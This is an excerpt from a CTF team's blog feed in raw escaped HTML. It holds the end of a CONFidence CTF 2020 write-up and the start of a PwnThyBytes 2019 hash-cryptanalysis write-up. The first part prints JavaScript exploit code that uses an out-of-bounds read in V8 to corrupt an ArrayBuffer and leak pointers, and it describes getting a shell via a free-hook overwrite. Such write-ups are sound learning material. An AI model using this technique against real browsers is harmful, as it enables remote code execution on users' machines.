&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; 
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;tarr_ix&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
    }
}
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;tarr_ix&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Locate array buffer&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ab_ix&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4000&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)  &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;ab_ix&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above code used the memory layout as a feature for locating the &lt;code&gt;ArrayBuffer&lt;/code&gt; from the memory:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-01-confidencectf/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Originally, we fetch the difference dynamically, but it turns out that this way not quite stable, so we just hardcode it with 650 (found base on experiment).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 650 is the threshold calculate from running the code in debugger
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// weird
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;diff&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;650&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// tarr_ix-ab_ix;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Difference : &amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;diff&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next, we will corrupt the size of the &lt;code&gt;ArrayBuffer&lt;/code&gt; we obtained and get it back:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tarr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;fill&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4000&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;,Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;diff&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;diff&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;));

&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;corrupted_ix&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;

&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[+] Now we corrupted one of the array size :)&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x200&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;ab&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;byteLength&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1337&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;corrupted_ix&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Our exploitation technique is simple, we will corrupt the backing store of the &lt;code&gt;ArrayBuffer&lt;/code&gt; and point it to anywhere in the memory.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-01-confidencectf/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;However, from the deployed pointer compression&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;, we cannot leak address directly. We will need to leak the upper part of the address instead. While scanning the memory, we found the upper part of the address:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-01-confidencectf/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The 0x0000007 pattern exist constantly throughout runtime, so we use the below code to scan the memory in order to retrieve the upper part of the address:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;up_byte&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lo_byte&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;up_byte&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
        &lt;span style=&#34;color:#a6e22e&#34;&gt;lo_byte&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oob_str_arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1620000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Thanks to the pointer compression, the step for leaking the binary base is much easier now. We can leak some pointer of d8. Then, using the CXA handler to resolve the GI abort and overwrite the free hook with system and call &lt;code&gt;console.log(&#39;sh&#39;)&lt;/code&gt; to get the shell. I exploit with &lt;a href=&#34;https://github.com/wwkenwong/CTF-Writeup/blob/master/browser/CONFidence_CTF_2020_Teaser_Chromatic_aberration/pwn_with_logs.js&#34;&gt;pwn_with_logs.js&lt;/a&gt; will crash due to weird GC issues.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping-chrome/&#34;&gt;A Eulogy for Patch-gapping Chrome&lt;/a&gt; &lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/document/d/10qh2-b4C5OtSg-xLwyZpEI5ZihVBPtn1xwKBbQC26yI&#34;&gt;Compressed pointers in V8&lt;/a&gt; &lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
    </item>
    
    <item>
      <title>PwnThyBytes CTF 2019 Writeup</title>
      <link>https://b6a.black/posts/2019-10-02-pwnthybytes/</link>
      <pubDate>Wed, 02 Oct 2019 23:20:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2019-10-02-pwnthybytes/</guid>
      <description>&lt;h2 id=&#34;pass-the-hash-warmuplearning-50-points&#34;&gt;Pass the Hash (Warmup/Learning; 50 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;We are given a &lt;em&gt;peculiar&lt;/em&gt; hash algorithm that generates 64-byte long hashes, which wraps of &lt;em&gt;sha0&lt;/em&gt;, &lt;em&gt;sha1&lt;/em&gt;, &lt;em&gt;sha256&lt;/em&gt; and &lt;em&gt;ripemd160&lt;/em&gt;. The hash takes two arguments, &lt;em&gt;salt&lt;/em&gt; (20 bytes) and &lt;em&gt;password&lt;/em&gt; (22 bytes). We are allowed to control the salt, whilst the goal is to find the password within 1024 queries.&lt;/p&gt;

&lt;h4 id=&#34;hash-construction&#34;&gt;Hash construction&lt;/h4&gt;

&lt;p&gt;We are given a &lt;em&gt;peculiar&lt;/em&gt; hash algorithm that generates 64-byte long hashes, which wraps of &lt;em&gt;sha0&lt;/em&gt;, &lt;em&gt;sha1&lt;/em&gt;, &lt;em&gt;sha256&lt;/em&gt; and &lt;em&gt;ripemd160&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The hash is defined by:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$L_0, R_0 = \text{password}\ |\ \text{salt}\ |\ \text{password}$ ($L_0, R_0$ separate the 64-byte block)&lt;/li&gt;
&lt;li&gt;$L_{i+1} = L_i \oplus h_R(R_i), R_{i+1} = R_i \oplus h_L(L_i)$, for $i = 0, 1, ..., 15$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Here $h_L$ and $h_R$ are the two hash algorithms that uses one of the commonly used hash algorithms based on the content. As this is a 32-byte block, if the hash algorithm itself does not consist 32 bytes, it would repeat itself until there are 32 bytes.&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;Solution&lt;/h3&gt;

&lt;h4 id=&#34;part-i-repeat-repeat-repeat&#34;&gt;Part I: Repeat, repeat, repeat&lt;/h4&gt;

&lt;div class=&#34;alert info&#34;&gt;
  One question that had brought up to my mind is: What if the $h_L$ and $h_R$ uses solely the 20-byte hash algorithms (i.e., all but sha256)?
&lt;/div&gt;
  

&lt;p&gt;Assume that 20-byte hash algorithms are used. Let&#39;s see what will happen in a round.&lt;/p&gt;

&lt;p&gt;Define $s_0\ |\ s_1\ |\ ...\ |\ s_9 := L_i\ | \ R_i$ and $t_0\ |\ t_1\ |\ ...\ |\ t_9 := L_{i+1}\ | \ R_{i+1}$, where:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;$s_0, s_2, s_3, s_6, s_7, s_9, t_0, t_2, t_3, t_6, t_7, t_9$ are 8 bytes long, and&lt;/li&gt;
&lt;li&gt;$s_1, s_4, s_5, s_8, t_1, t_4, t_5, t_8$ are 4 bytes long.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then we have:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$t_0\ |\ t_1\ |\ ...\ |\ t_4 = s_0\ |\ s_1\ |\ ...\ |\ s_4\ |\ h_R(s_5\ |\ s_6\ |\ ...\ |\ s_9)$, and&lt;/li&gt;
&lt;li&gt;$t_5\ |\ t_6\ |\ ...\ |\ t_9 = s_5\ |\ s_6\ |\ ...\ |\ s_9\ |\ h_L(s_0\ |\ s_1\ |\ ...\ |\ s_4)$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;However, since the first and last 12 bytes of $h_R(\cdot)$ are equal, we have&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$s_0 \oplus t_0 = s_3 \oplus t_3$, and&lt;/li&gt;
&lt;li&gt;$s_1 \oplus t_1 = s_4 \oplus t_4$.&lt;/li&gt;
